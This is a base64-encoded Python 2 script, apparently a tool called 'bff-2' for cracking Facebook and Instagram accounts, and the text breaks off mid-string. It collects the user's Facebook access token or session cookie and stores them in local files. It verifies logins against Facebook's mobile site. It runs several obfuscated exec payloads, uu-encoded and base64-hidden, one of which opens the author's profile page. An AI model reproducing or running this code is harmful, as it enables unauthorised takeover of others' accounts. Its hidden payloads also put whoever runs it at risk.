zFBPEIhKj02PUEoJClPOyY1SCgkQFM6Iy0oLFIgWjEgSUU+JjVDKiJBTDg2VUJcbk05JiRAN1VcXEwoJVxcTCgjSEA3UkFCKVYpRTlWRU4oIzhWLUIgXFw5JiVUODNZPDtEVEg0QiRELkMoQShTTTZcbk01NSBaLUUlJSoiMSU1I1RSKDIoWi1CNTIqIjBFNCNAUig1LFosQiUhLlM5KTIzUSIoJUhdMCRBIyoiMElcbk01I1UyKDI5PDtEVFs1RSUsLlU8XFwwIyRGNzRYWjRCJSIvJDk8NyQgTjBCJSgvNVBHLDUgXFw0VEEvKlU4XVxuTTIzVEYwNTRYMEVFIy5VOTQzUyxWKTUoWjRFNFovMzhNMlVRTjMyKSIrJCBSNUI1My5DOSAwIzE3LDQkXFxcbk0wQiRKLzM4XTAyQEQqNFxcWylDNSgqIjEgNFNIQysyQEw0QiE6LDIhKTEzWEYtNCxKKEQlLC4jOTUwRVFOXG5NMzNERikkIFc1NVE8MyJARTclUSwqIi0oMCM9MjA0KEk1QkUlLjU5JTNCQEMuJThNMEIhPDcjREYpNTBYXG5NLFVEXFwuVDE0MiMxIikkME4wUkEhKiUtLS1FUU4zMzRVKCVITTEyNEUqQihRKTM0QzUlKEgsQkE6KzQoVVxuTSxCSEIsJDRUKFQhMiojNEw2QlEiKTIkTjRTREksQy0xKEJARTIlVFApJCRDKkIoUDI1UU4zMzRDNTMoSFxuTSxDRFxcLlQxNDZTNSUpMlBONTNRPDcjIEMpJDhXLSVBOi0kKEUoQlxcRC4zUFcpIiEuLCQoRSoiXFxVNCQ8TFxuTS0yITw3IzE0MDJcXEo1M0E9NyZZLSxDLTQxQyBVLSVAUDE0NEMrRTRZLSMtMyslOEktMkE6LSQ0VDZCXFxTXG5NLiRUUjU1JS4sUyhJKEJMRCglKFUwQzRTK0QsWSgjIEMsMzxMLSIxPDclUU4zMyEiKSRITyxTQT0sIykgXG5NMSJIVDclUTsqNCxVKiJIQiwyIFQ0VEEjKlMpIDMjMSIoM0hMLEIkSSwzLTgxQlRUKyRISDEiNEwrQixZXG5NLTMhJTQ0WTw7RFRTLFQxJioyMEA1UzRVNDNQUyhEISUtUjUxKyJIQisyQFAoU1RSLCMwSDIzNSIxMjROXG5NLTNERSxUKSAwUlhFLiRUUDBCJFxcLVItJDFCRFUsJUE8O0RUTDU0MTw3Ilk0LDMwUihTJEIqMjBQM0MhMlxuTTAyJEopMlRNKzQ1MTNDLFMtJTRIKTRBLSwzKFQxMkkiKiUkSSxTMSMtMjRIMiJRIjAzSEstIkE1NyZZLVxuTSskKSgwQlBELSUwSDUiJFIqQixUMyM5IjQyKEksQjEuLSUtJDIyUSMrMyRIMEQhJSxCNTQ0IkREKSQsSlxuTTBCQTAsQzUxM0MsUy0kLFUsUkEoNyZZLSskLSQ3JVBONSMkVC1FLFUpMkRSNCRYVSxVJFxcLVIsQDBSRERcbk0uJTxNKTQkWisyMEgxMkEiNyVRJCtDLTA1UkRCKDJYTCkiQSUqQik8NyU0VCkjUSw3JlktKzMoQS8jPENcbk0sMzBQLEVRPDJDNFMwM1RXKUVETSskLE0tIyUjKCU0TSk0ITAsMzBUMFJNJS0lRE0oUlRTKlI0WDIyVFJcbk0wM0hNKSMxNC1EKTw3JS08O0RUTiklMTItMzRFK0JRMyokREgwRFEkKiI0SDUzISMtJSxLMSJROSoiLEBcbk0wUlBTLyRQTShDJFxcLVI1MTNDLFMoMihJKSRBLyslLSEvMlBDKjIhPDtEVFEoREE0LVI1MS5SSFQrJTRKXG5NKERBIisjKEA1IzE0MDIsSjRSREAsUixRKEJAUzIkUEwwQjEpKyMsTS4jJSI1JTBLKSRBKCwyKFQzIk0iXG5NKyVFPDtEVE0sUiRFLSMxOS8jTSQ1JSxMNSMkRipDKFAwIzUzLSU0VCxVITMqJDBBKTJVMi0zJEsoREEiXG5NKlMpIDQiQTM1JShMKFMhKCxDLFUoQyRSLSRZPDtEVE0sVDElKyUwSSgjITI2JDROKSUxMCwkKEQ3JVBNXG5NNEJURCw0KSQ1MlBFMDNQWzElMSwtMzBRLyM8QjYzMEwsUyE1LSUsUS0yVFItM1BXKSUxNTcmWS0rJSxRXG5NLzJMQyskVE4oUjRFLSMxODRSUSUsMzBKNEMxPDcjNFMpJShNKSIxKywzKTEuIlEjKyQwUDRSISUrMjRcXFxuTTMjNFUpJVE8KzM0TDUjNFU0NFk8O0RUUyxTMSUtUjUxKkJIRCozMFUoRSEiKlMpNDMzMSQ0MjBNMEM0UVxuTStSKTQ1MlBFLSRQVDE1JFxcLSQpODEyVEUrJFBQMSMkRCpFLEw1MkBDLzItPDtEVE8pIkEvKyQoUStSVEVcbk0rMzBVLFNRJi1DKTQzMzEyNSVRPC1SOTkrMlUyLSVRPC0zKTQ1MlBTNyVRLS0kLSQ2MkkzKjM0TSxFMTNcbk0tMjE8NyUwVDUzJFU3JlktKlM0TDMyXFxDLyQ0TykzMS0rMyxEN1JJMy0lMFUsRVE8NEM8UyskXFxMNFMkV1xuTSpSNFUsMlxcQy4zLE0sUkE1KjM1MS8jLTU0NFhTLEQxMy0yMFQzNVFOMzJEUjQzVEssUlE8NyM0UjIkNFNcbk0pJTEtKzMsUSxCVTIuM0RLLERUQysiNFQzUlEyKSUsSzRSUTQtNSkxLTMwUzQlNFQ0UyRVKzMoVS8jPERcbk01JTU8O0RUTDRTJF0qUyhUMzJUUjclUSIsMyxJLyNNJDUlJEktNSRcXCxULEEsUlRFNSRUSSxTMTErJTBMXG5NMyMxMyslLE0pM1EsLTM0RDclUE0tMlE0LTMsVDE1UU4zMzxFNDJUTSxSUTQtUyktLTJMUiwlNFQ0QiRTXG5NKzUoVSwyWTMvJDhWLEUxKisyKSEtMkkzKjNAUSk1JS4sUyk4MTJERSgkUFEoQjEjKlMsSDQlUU4zMyBDXG5NKjIoUCxCQTErJCxRK1JQRCsyMFEsRTEyKkMoRDIjITIsMihMMEMhKC0jKTQ1MlBTNyVRKywlKTEvMkhDXG5NKyQwVDRSITMrMjRcXDMjNFUpJVE8NyZZLSszNEw0MkElNDRYUyxEITMtMjEoMiMhJCwyIEsoQyE1KyMsTVxuTSkzMFQ2JSxMNEUkUysyLE0sIyhTLSQsTSkzISssMikhLjJNMyskVEgwUiEyNyZZLSpCNEQyIyREKSU8S1xuTSxSUTUrMixdLEM0Uy0kWEksUyRWKkI0UDQyVSU0NFhTLEREUypTLTA1UkRTNDM0SyxTMTQsJCktKEJMRVxuTTQzUEw0UlEkNyZZLS0kLFQ0QkxENCRQVS0yMTw3IlUjKjI0SDRFMTIqUjE4NTJRNCklJE00Q0RZKlMpMFxuTTRSTEU1JFRMNFUkUys1KFUsMkhCMiQ0TSkyNFxcLlQxNDIlUU4zMkEkMSQoSjBDJEAtMixBKSJAUiokSFBcbk0wUjElKlUoTSsyREMtJDBKKTIxLSszLEQ3UkkzLSUwVSxFUTw0QzxTKyUkSSxVJFAqUyhMNDJYQjUlLTxcbk07RFRNLFMhNy0kNFQ1Mk0iLSQwVCxFJFQqMjRZLyNNJDUkVFQ0UiRQKzQsVSwzLSMrJShVKTMxNSslKEFcbk0rUlBFKzIkSyxFJFUqUykwNSMhJCgyNTw7RFRNLEMkQCxCLEQwQkREKiRMUShFJFkqUyxMNCMhMyslLE9cbk0pJEEtKyUoRDIiTEIsJSBUKFJEQi0zLFUvI00kNSRUTDUzJE8rMjRNLSM0UjUzLTw7RFRLLFUxLyolMTRcbk0xIlRSLSVRPC0zKTQ1MlBTNyVRKyszLFEtMk0zLTMkUzBSUTItUyxMM1JRMywzPEspMzRRK1IsVSxSVEVcbk0tJTRJLTUkXFwsUyxUNFVRTjMyVEU1JExVLEUkXS1SOTkrMkxTKyVRPC0lLFxcMTMwUy8kVEw0UzE0KzU0SVxuTS0yVFIyJDBIKTNRLCwyKEQwQkxCKiUgUihSRFMrIyhINCJRJCwyQTw7RFRMLEJBJCxDKS0tMkxFNSRUTFxuTTRVJFMrNShVLDJVMjUlLE0sUyE3LTM0RStDPEY2MlRMNFJEVSszKTQ0UzRENyVRNC0lNFEtMkxVKyRUT1xuTSxFUTwwVVFOMzMsUiwlNEksVSRVKyMoTDQyXTIzJTRNKTMxLyskNTQ0Uk0zKyUwVTRFJFUtIy0wNTMxM1xuTSwzNE0sQzRcXC1SMTQ1MlEzLDNUSjUzMSwtUzUxM0VRTjMzLFI0MihQKSMxNSoyMEEqIlBSKiQwUDBEVERcbk0rIjUkMjJRMiwzKEwoUkEpK1ItLSkjNEUpJEBRKSIxNypTLEw1MlRDLzMoVSxTMS0rJTRRK1VRTjMyVEVcbk0rMzBVLEU0UysiNFA1UyEkLSQsSyxSQSwsUzUxM0MsUy0lLFEpMjEsKiUpNDMiVFQqMkBVKEUhMy0iNSxcbk00IzEjKSVASjRSUTUrMixdLEVRTjMzNFMtJFRMNTMkTysyNE0tIzRSNTMsSyxVITcqMjBBKiJUUyskMFBcbk0oU1EmLUMpNDJDJEIwMkBMMFJRKCwkNTEzQyxTKCUoSikyMSgsJChRLyVRTjMzPEI2MzBKKSIxLyolMTRcbk0xQkxTLDNAVixEMTUqMyk4MkJUUjElJEs1MlE9KyQsRDEjJEQyJEBQMSMxNSpVLEw1MlxcUygzLFMsU0EsXG5NKzIsUS4lUU4zMlREKjIkSyhFNFUrMy01LyNNJDUlKEw1JSRXKkIsUS8jPEU0M1BMLTJRJC1VLFxcMUM4RVxuTSwkVFUsRDEgKyM0TSgyVSMvJTBMKTQxLSwkNFQ0VVFOMzJJIy0kREkoUlRDLDIwWDMyVEI0M0xNLSJRJVxuTSozKSkoUkhSLCRASS0yNE4qQihVLDMtJTQ0WFMsVDE2LUMwUDVSRSUwNVBHKkUoVS8yXTIyJSk8O0RUUVxuTSkkISgsNSxVLTJVNS4kVFM0VDEmKzMwTDIjISUpJVxcTTUzREUsUy0wMUM8VSolVEktNTE/KkQoSDczITNcbk0zMzhMLSMxOC01KTE3IjxKMFJEWTcmWS0sMjUxM0M8Qi8lRE0wRTRPK0MoWDUjKFIyJSBIKEIkXFwuVChBXG5NLyNNJi00WFkpNSUuKjUpMS9TPTIxJERKKEJFNS8zNT0wU002LDQ0WDRCQSw3JlhdLVU1PTIzTFcoNFxcXFxcbk0xUyRfLVUpIDFTQTY3NDBZLUJVMyo1KSQzQ0RGLTQsWzVDJSUqQykkKCVRTiglUU45NllENyZYRyslXT9cbksqMkRIKEc1VTdWLU85JjVDKEJRPzdWRU08Jl1SPSVdPyoiPUM7VjFFOFcsRyoyWUQ5Ni1POSY0SSowICBcbiBcbmVuZFxuJyxfXykpKCJ1dV9jb2RlYyIsX19pbXBvcnRfXygnY29kZWNzJykuZGVjb2RlKSkNCg0KIyBLVU1QVUxBTiBXQVJOQQ0KTSA9ICdceDFiWzE7OTFtJyAjIE1FUkFIDQpIID0gJ1x4MWJbMTs5Mm0nICMgSElKQVUNCksgPSAnXHgxYlsxOzkzbScgIyBLVU5JTkcNCkIgPSAnXHgxYlsxOzk0bScgIyBCSVJVDQpVID0gJ1x4MWJbMTs5NW0nICMgVU5HVQ0KTyA9ICdceDFiWzE7OTZtJyAjIEJJUlUgTVVEQQ0KUCA9ICdceDFiWzE7OTdtJyAjIFBVVElIDQpOID0gJ1x4MWJbMG0nICMgV0FSTkEgTUFUSQ0KYWNhayA9IFtNLCBILCBLLCBCLCBVLCBPLCBQXQ0Kd2FybmEgPSByYW5kb20uY2hvaWNlKGFjYWspDQp0aWwgPSLigKIiIA0Kb2ssIGNwLCBpZCwgdXNlciwgbG9vcCA9IFtdLCBbXSwgW10sIFtdLCAwDQpwd3ggPSBbXQ0Kc3lzLnN0ZG91dC53cml0ZSgnXHgxYlsxOzM1bVx4MWJdMjsg4pynIGJmZi0yIGJ5IHJvbXog4pynIFx4MDcnKQ0KDQpkZWYgamFsYW4oa2VsaWxpbmcpOg0KCWZvciBtYXUgaW4ga2VsaWxpbmcgKyAnXG4nOg0KCQlzeXMuc3Rkb3V0LndyaXRlKG1hdSkNCgkJc3lzLnN0ZG91dC5mbHVzaCgpO2plZGEoMC4wMykNCmRlZiB0aWsoKToNCiAgICB0aXRpayA9IFsnLiAgICcsJy4uICAnLCcuLi4gJ10NCiAgICBmb3IgbyBpbiB0aXRpazoNCiAgICAgICAgcHJpbnQgKCdcciVzJXMgbWVuZ2hhcHVzIGFrdW4gZGFyaSB0ZXJtdXggJXMnJShNLHRpbCxvKSksDQogICAgICAgIHN5cy5zdGRvdXQuZmx1c2goKTtqZWRhKDEpDQpkZWYgY2xlYXIoKToNCglvcy5zeXN0ZW0oImNsZWFyIikNCmRlZiBmb2xkZXIoKToNCgl0cnk6b3MubWtkaXIoJ09LJykNCglleGNlcHQ6cGFzcw0KCXRyeTpvcy5ta2RpcignQ1AnKQ0KCWV4Y2VwdDpwYXNzDQoJdHJ5Om9zLm1rZGlyKCdkYXRhJykNCglleGNlcHQ6cGFzcw0KIyBMT0dPIChMTyBHT0JMT0spDQpkdCA9IHJlcXVlc3RzLmdldCgiaHR0cDovL2lwLWFwaS5jb20vanNvbi8iKS5qc29uKCkNCnRyeToNCiAgICBJUCA9IGR0WyJxdWVyeSJdDQogICAgQ04gPSBkdFsiY291bnRyeSJdDQpleGNlcHQgS2V5RXJyb3I6DQogICAgSVAgPSAiICINCiAgICBDTiA9ICIgIg0KZXhlYyhiYXNlNjQuYjY0ZGVjb2RlKCdZWFYwYUc5eUlEMGlVbTl0YVNCQlpuSnBlbUZzSWdwbVlsOXRaU0E5SW1aaFkyVmliMjlyTG1OdmJTOXliMjFwTG1GbWNtbDZZV3d1TVRBeUlncG5hWFJvZFdJZ1BTSm5hWFJvZFdJdVkyOXRMMDFoY21zdFduVmpheUk9JykpDQpkZWYgYmFubmVyKCk6IA0KICAgIHByaW50ICgnICVzJXMlcyVzJXMlcyAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJXMlcyVzJXMlcyVzXG4lcyAgIF9fX19fX18gIF9fX19fXyBfX19fX19fIF9fX19fX18gXyAgICAgX1xuICAgfCAgICAgICB8X19fX18vIHxfX19fX3wgfCAgICAgICB8X19fXy8gXG4lcyAgIHxfX19fXyAgfCAgICBcXF8gfCAgICAgfCB8X19fX18gIHwgICAgXFxfXG5cbiAgICAgJXMgICAgJXMgJXNDb2RlZCBieSAlczogJXMlcyAlcyVzICAgXG4gJXMlcyVzJXMlcyVzICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAlcyVzJXMlcyVzJXMgXG4gJXMjICVzRmIgICVzIDogJXMlcyBcbiAlcyMgJXNHaXQlcyAgOiAlcyVzIFxuICVzIyAlcy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0gJXMjICAnJQ0KICAgIChNLHRpbCxLLHRpbCxILHRpbCxNLHRpbCxLLHRpbCxILHRpbCxNLFAsVSx0aWwsSyxNLEssYXV0aG9yLFUsdGlsLE0sdGlsLEssdGlsLEgsdGlsLE0sdGlsLEssdGlsLEgsdGlsLFUsTyxNLE8sZmJfbWUsVSxPLE0sTyxnaXRodWIsUCxNLFApKQ0KICAgIHByaW50ICgnICVzIyVzIElQICAgJXM6JXMgJXMgJXMtICVzJXMgJyUoVSxPLE0sTyxJUCxILE8sQ04pKQ0KIyBNQVNVSyBUT0tFTiAoVE9LRU4gTElTVFJJSykNCmhlYWRlciA9IHsndXNlci1hZ2VudCc6J01vemlsbGEvNS4wIChYMTE7IExpbnV4IHg4Nl82NDsgcnY6NDUuMCkgR2Vja28vMjAxMDAxMDEgRmlyZWZveC80NS4wJ30NCmRlZiBtYXN1aygpOg0KICAgIG9zLnN5c3RlbSgnY2xlYXInKTtiYW5uZXIoKQ0KICAgIHByaW50ICgnXG4lcyVzJXMgMDEgJXNMb2dpbiBpbnN0YWdyYW0gKGNyYWNrIGFrdW4gaW5zdGFncmFtKSBcbiVzJXMlcyAwMiAlc0xvZ2luIHZpYSBjb29raWUgKGNyYWNrIGFrdW4gZmFjZWJvb2spXG4lcyVzJXMgMDMgJXNMb2dpbiB2aWEgdG9rZW4gKGNyYWNrIGFrdW4gZmFjZWJvb2spXG4lcyVzJXMgMDQlcyBDYXJhIG1lbmRhcGF0a2FuIHRva2VuICYgY29va2llIGZhY2Vib29rIFxuJXMlcyVzIDAwICVzS2VsdWFyJyUoVSx0aWwsSyxPLFUsdGlsLEssTyxVLHRpbCxLLE8sVSx0aWwsSyxPLFUsdGlsLE0sTykpDQogICAgcm9tID0gcmF3X2lucHV0ICgiXG4lcyMgJXNQaWxpaCAlcz4gJXMiJShQLE8sTSxLKSkNCiAgICBpZiByb20gaW4oIiIpOg0KICAgIAlwcmludCgiJXMlcyB3cm9uZyBpbnB1dCAiJShNLHRpbCkpO2V4aXQoKQ0KICAgIGVsaWYgcm9tIGluICgnMScsJzAxJyk6DQogICAgCWlnZygpDQogICAgZWxpZiByb20gaW4gKCcyJywgJzAyJyk6DQogICAgCWphbGFuKCJcbiVzISVzIFdhamliIGd1bmFrYW4gYWt1biB0dW1iYWwgZGlsYXJhbmcgYWt1biB1dGFtYSIlKE0sTykpDQogICAgCWtvb2sgPSByYXdfaW5wdXQoIiVzIyAlc0Nvb2tpZSAlcz4gJXMiJShQLE8sTSxLKSkNCiAgICAgICAgaWYga29vayBpbigiIik6DQogICAgICAgIAlwcmludCAoIiVzJXMgaXNpIGNvb2tpZSBrZW50b2QgIiUoTSx0aWwpKTtleGl0KCkNCiAgICAgICAgb3BlbignZGF0YS9jb29raWVzJywgJ3cnKS53cml0ZShrb29rKQ0KICAgICAgICBrb252ZXJ0ZXIoKQ0KICAgICAgICBleGl0KCkNCiAgICBlbGlmIHJvbSBpbiAoJzMnLCcwMycpOg0KICAgICAgICBqYWxhbigiXG4lcyElcyBXYWppYiBndW5ha2FuIGFrdW4gdHVtYmFsIGRpbGFyYW5nIGFrdW4gdXRhbWEiJShNLE8pKQ0KICAgIAlyb216ID0gcmF3X2lucHV0KCIlcyMgJXNUb2tlbiAlcz4gJXMiJShQLE8sTSxLKSkNCiAgICAgICAgaWYgcm9teiBpbigiIik6DQogICAgICAgIAlwcmludCAoIiVzJXMgaXNpIHRva2VuIGtlbnRvZCAiJShNLHRpbCkpO2V4aXQoKQ0KICAgIAl0cnk6DQogICAgICAgICAgICBuYW1hID0gcmVxdWVzdHMuZ2V0KCdodHRwczovL2dyYXBoLmZhY2Vib29rLmNvbS9tZT9hY2Nlc3NfdG9rZW49JXMnJShyb216KSxoZWFkZXJzPWhlYWRlcikuanNvbigpWyduYW1lJ10NCiAgICAgICAgICAgIHByaW50ICgnXG4lcyVzIExvZ2luIHN1Y2NlcywgbW9ob24gdHVuZ2d1ICclKEgsdGlsKSkNCiAgICAgICAgICAgIG9wZW4oJ2RhdGEvdG9rZW4udHh0JywgJ3cnKS53cml0ZShyb216KTtsb2dpbl94eCgpDQogICAgICAgICAgICBleGVjKGJhc2U2NC5iNjRkZWNvZGUoJ2IzTXVjM2x6ZEdWdEtDZDRaR2N0YjNCbGJpQm9kSFJ3Y3pvdkwzZDNkeTVtWVdObFltOXZheTVqYjIwdmNtOXRhUzVoWm5KcGVtRnNMakV3TWljcE8yMWxiblVvS1E9PScpKQ0KICAgICAgICAgICAgZXhpdCgpDQogICAgICAgIGV4Y2VwdCAoS2V5RXJyb3IsSU9FcnJvcik6DQogICAgICAgIAlwcmludCAoIiVzJXMgVG9rZW4gaW52YWxpZCAiJShNLHRpbCkpO2plZGEoMik7bWFzdWsoKQ0KICAgIGVsaWYgcm9tIGluICgnNCcsICcwNCcpOg0KICAgIAlwcmludCAoIlxuJXMlcyAlc1VudHVrIG1lbmRhcGF0a2FuIHRva2VuICVzOiVzIiUoVSx0aWwsSCxNLEgpKTtqZWRhKDAuMDIpDQogICAgICAgIHByaW50ICgiIC0gc2lhcGthbiBha3VuIGZhY2Vib29rICh3YWppYiBha3VuIHR1bWJhbCkiKTtqZWRhKDAuMDIpDQogICAgICAgIHByaW50ICgiIC0gbG9naW5rYW4gYWt1biBmYWNlYm9vayAodHVtYmFsKSBkaSBicm93c2VyICVzQ2hyb21lICVzIiUoTyxIKSk7amVkYSgwLjAyKQ0KICAgICAgICBwcmludCAoIiAtIHVybCBhbGFtYXQgd2FqaWIgJXNodHRwczovL20uZmFjZWJvb2suY29tICVzKG1vZGUgZGF0YSkiJShPLEgpKTtqZWRhKDAuMDIpDQogICAgICAgIHByaW50ICgiIC0gc2FsaW4gbGluayA6ICVzdmlldy1zb3VyY2U6aHR0cHM6Ly9idXNpbmVzcy5mYWNlYm9vay5jb20vYnVzaW5lc3NfbG9jYXRpb25zIiUoTykpO2plZGEoMC4wMikNCiAgICAgICAgcHJpbnQgKCIlcyAtIHRhcnVoIGxpbmsgdGVyc2VidXQgZGkgdXJsIGFsYW1hdCBmYWNlYm9vayBsYWx1IGtsaWsgY2FyaSAiJShIKSk7amVkYSgwLjAyKQ0KICAgICAgICBwcmludCAoIiAtIGppa2Egc3VkYWgsIGtsaWsgJXN0aXRpayB0aWdhICVzcG9qb2sga2FuYW4gYXRhcyAiJShPLEgpKTtqZWRhKDAuMDIpDQogICAgICAgIHByaW50ICgiIC0ga2VtdWRpYW4ga2xpayAlc0NhcmkgZGkgSGFsYW1hbiAlcyIlKE8sSCkpO2plZGEoMC4wMikNCiAgICAgICAgcHJpbnQgKCIgLSBrZXRpayAlc0VBQUcgJXNha2FuIG11bmN1bCBhY2NlcyB0b2tlbi4iJShPLEgpKTtqZWRhKDAuMDIpDQogICAgICAgIHByaW50ICgiIC0gamlrYSBzdWRhaCBqYW5nYW4gbHVwYSBkaSBzYWxpbiBcbiIpO2plZGEoMC4wMikNCiAgICAgICAgcHJpbnQgKCIlc+KAoiVzIFVudHVrIG1lbmRhcGF0a2FuIGNvb2tpZSAlczolcyAiJShVLEgsTSxIKSk7amVkYSgwLjAyKQ0KICAgICAgICBwcmludCAoIiAtIHNpYXBrYW4gYXBsaWthc2kga2l3aSBicm93c2VyLCBkb3dubG9hZCBkaSBwbGF5IHN0b3JlIGppa2EgYmVsdW0iKTtqZWRhKDAuMDIpDQogICAgICAgIHByaW50ICgiIC0gbG9naW4ga2FuIGFrdW4gZmFjZWJvb2sgYW5kYSBkaSBraXdpIGJyb3dzZXIuIGFrdW4gd2FqaWIgbW9kZSBkYXRhIik7amVkYSgwLjAyKQ0KICAgICAgICBwcmludCAoIiAtIHNhbGluIGxpbmsgOiAlc2h0dHBzOi8vY2hyb21lLmdvb2dsZS5jb20vd2Vic3RvcmUvZGV0YWlsL2dldC1jb29raWUvbmFjaWFhZ2JraWZocG5vb2Rsa2hiZWpqbGRhaWZmY20vcmVsYXRlZCIlKE8pKTtqZWRhKDAuMDIpDQogICAgICAgIHByaW50ICgiICVzLSBrZXRpayAlc24lcy8lc04gJXNsYWx1IGVudGVyIHVudHVrIG1lbGloYXQgdHV0b3JpYWxcbiAiJShILE0sTyxNLEgpKTtqZWRhKDAuMDIpDQogICAgICAgIG5hbnlhID0gcmF3X2lucHV0KCclcyVzJXMgQW5kYSBwYWhhbT8gJXN5JXMvJXNuIDolcyAnJShVLHRpbCxPLEgsTyxNLEspKQ0KICAgICAgICBpZiBuYW55YSBpbigiIik6DQogICAgICAgIAlwcmludCAoIiVzJXMgc2F5YSBiZXJ0YW55YSB3YWppYiBkaSBqYXdhYiAiJShNLHRpbCkpO2plZGEoMik7bWFzdWsoKQ0KICAgICAgICBlbGlmIG5hbnlhIGluKCJ5IiwiWSIpOg0KICAgICAgICAJcHJpbnQgKCJcbiVzJXMgc2VsYW1hdCBhbmRhIHBpbnRhciA6KiAiJShILHRpbCkpO2plZGEoMik7bWFzdWsoKQ0KICAgICAgICBlbGlmIG5hbnlhIGluKCJuIiwiTiIpOg0KICAgICAgICAJcHJpbnQgKCJcbiVzJXMgYnVrYSBkZW5nYW4gZmFjZWJvb2sgIiUoTSx0aWwpKTtqZWRhKDIpO29zLnN5c3RlbSgieGRnLW9wZW4gaHR0cHM6Ly93d3cuZmFjZWJvb2suY29tLzEwMDA2NzgwNzU2NTg2MS9wb3N0cy8yMzE2NTA2OTU3NzE4NDgvP2FwcD1mYmwiKTttYXN1aygpDQogICAgZWxpZiByb20gaW4gKCcwJywgJzAwJyk6DQogICAgCWV4aXQoJ1xuJykNCiAgICBlbHNlOg0KICAgIAlwcmludCgiJXMlcyB3cm9uZyBpbnB1dCAiJShNLHRpbCkpO2V4aXQoKQ0KIyBDRUsgQ09PS0lFIE1FTlUgNC02DQpob3N0ID0gKCdodHRwczovL21iYXNpYy5mYWNlYm9vay5jb20nKQ0KdWEgPSAoIk5va2lhQzMtMDAvNS4wICgwNy4yMCkgUHJvZmlsZS9NSURQLTIuMSBDb25maWd1cmF0aW9uL0NMREMtMS4xIE1vemlsbGEvNS4wIEFwcGxlV2ViS2l0LzQyMCsgKEtIVE1MLCBsaWtlIEdlY2tvKSBTYWZhcmkvNDIwKyIpDQpoID0geydIb3N0JzogJ21iYXNpYy5mYWNlYm9vay5jb20nLCAnY2FjaGUtY29udHJvbCc6ICdtYXgtYWdlPTAnLCAndXBncmFkZS1pbnNlY3VyZS1yZXF1ZXN0cyc6ICcxJywgJ3VzZXItYWdlbnQnOiB1YSwgJ2FjY2VwdCc6ICd0ZXh0L2h0bWwsYXBwbGljYXRpb24veGh0bWwreG1sLGFwcGxpY2F0aW9uL3htbDtxPTAuOSxpbWFnZS93ZWJwLGltYWdlL2FwbmcsKi8qO3E9MC44JywgJ2FjY2VwdC1lbmNvZGluZyc6ICdnemlwLCBkZWZsYXRlJywgJ2FjY2VwdC1sYW5ndWFnZSc6ICdpZC1JRCxpZDtxPTAuOSxlbi1VUztxPTAuOCxlbjtxPTAuNyd9DQpkZWYgX19yb216X18oKToNCglpZiBvcy5wYXRoLmV4aXN0cygiZGF0YS9jb29raWVzIik6DQoJCWlmIG9zLnBhdGguZ2V0c2l6ZSgiZGF0YS9jb29raWVzIikgIT0wOg0KCQkJcmV0dXJuIGN2ZChvcGVuKCdkYXRhL2Nvb2tpZXMnKS5yZWFkKCkuc3RyaXAoKSkNCgkJZWxzZTpfcm9taVhEXygpDQoJZWxzZTpfcm9taVhEXygpDQpkZWYgX3JvbWlYRF8oc2hvdz1UcnVlKToNCglpZiBzaG93PT1UcnVlOg0KCQkjb3Muc3lzdGVtKCJjbGVhciIpDQoJCSNiYW5uZXIoKQ0KCQlwcmludCgiXG4lcyVzJXMgU3VwYXlhIGJla2VyamEgbWFzdWthbiBjb29raWUgZmFjZWJvb2sgYW5kYSIlKFUsdGlsLE8pKQ0KCWNrPXJhd19pbnB1dCgiJXMjICVzQ29va2llICVzPiAlcyIlKFAsTyxNLEspKQ0KCWlmIGNrPT0iIjoNCgkJX3JvbWlYRF8oc2hvdz1GYWxzZSkNCgl0cnk6DQoJCWNrcz1jdmQoY2spDQoJCWlmIGt1ZWgoY2tzKT09VHJ1ZToNCgkJCW9wZW4oImRhdGEvY29va2llcyIsInciKS53cml0ZShjayk7ZXhpdCgiJXMlcyBsb2dpbiBzdWNjZXNzLCBrZXRpazogcHl0aG9uMiBiZmYtMi5weSAiJShILHRpbCkpDQoJCWVsc2U6cHJpbnQoIiVzJXMgbG9naW4gZ2FnYWwuIiUoTSx0aWwpKTtfcm9taVhEXyhzaG93PVRydWUpDQoJZXhjZXB0IEV4Y2VwdGlvbiBhcyBlOg0KCQlwcmludCgiJXMlcyBlcnJvciA6ICVzXG4iJShNLHRpbCxlKSkNCgkJX3JvbWlYRF8oc2hvdz1GYWxzZSkNCmRlZiBrdWVoKGNvb2tpZXMpOg0KCV93dGZfPUZhbHNlDQoJYj1yZXF1ZXN0cy5nZXQoImh0dHBzOi8vbWJhc2ljLmZhY2Vib29rLmNvbS9wcm9maWxlLnBocCIsaGVhZGVycz17J29yaWdpbic6ICdodHRwczovL21iYXNpYy5mYWNlYm9vay5jb20nLCAnYWNjZXB0LWxhbmd1YWdlJzogJ2lkLUlELGlkO3E9MC45LGVuLVVTO3E9MC44LGVuO3E9MC43JywgJ2FjY2VwdC1lbmNvZGluZyc6ICdnemlwLCBkZWZsYXRlJywgJ2FjY2VwdCc6ICd0ZXh0L2h0bWwsYXBwbGljYXRpb24veGh0bWwreG1sLGFwcGxpY2F0aW9uL3htbDtxPTAuOSxpbWFnZS93ZWJwLGltYWdlL2FwbmcsKi8qO3E9MC44JywgJ3VzZXItYWdlbnQnOiB1YSwgJ0hvc3QnOiAoJycpLmpvaW4oYnM0LnJlLmZpbmRhbGwoJzovLyguKj8pJCcsICdodHRwczovL21iYXNpYy5mYWNlYm9vay5jb20nKSksICdyZWZlcmVyJzogJ2h0dHBzOi8vbWJhc2ljLmZhY2Vib29rLmNvbS9sb2dpbi8/bmV4dCZyZWY9ZGJsJmZsJnJlZmlkPTgnLCAnY2FjaGUtY29udHJvbCc6ICdtYXgtYWdlPTAnLCAndXBncmFkZS1pbnNlY3VyZS1yZXF1ZXN0cyc6ICcxJywgJ2NvbnRlbnQtdHlwZSc6ICdhcHBsaWNhdGlvbi94LXd3dy1mb3JtLXVybGVuY29kZWQnfSxjb29raWVzPWNvb2tpZXMpLnRleHQJDQoJaWYgIm1iYXNpY19sb2dvdXRfYnV0dG9uIiBpbiBiLmxvd2VyKCk6DQoJCV93dGZfPVRydWUNCgkJaWYgX3d0Zl89PVRydWU6DQoJCQlyZXR1cm4gVHJ1ZQ0KCQllbHNlOg0KCQkJZXhpdCgiJXMlcyBsb2dpbiBnYWdhbC4gIiUoTSx0aWwpKQ0KZGVmIGhkY29rKCk6DQogICAgaG9zdHMgPSBob3N0DQogICAgciA9IHsnb3JpZ2luJzogaG9zdHMsICdhY2NlcHQtbGFuZ3VhZ2UnOiAnaWQtSUQsaWQ7cT0wL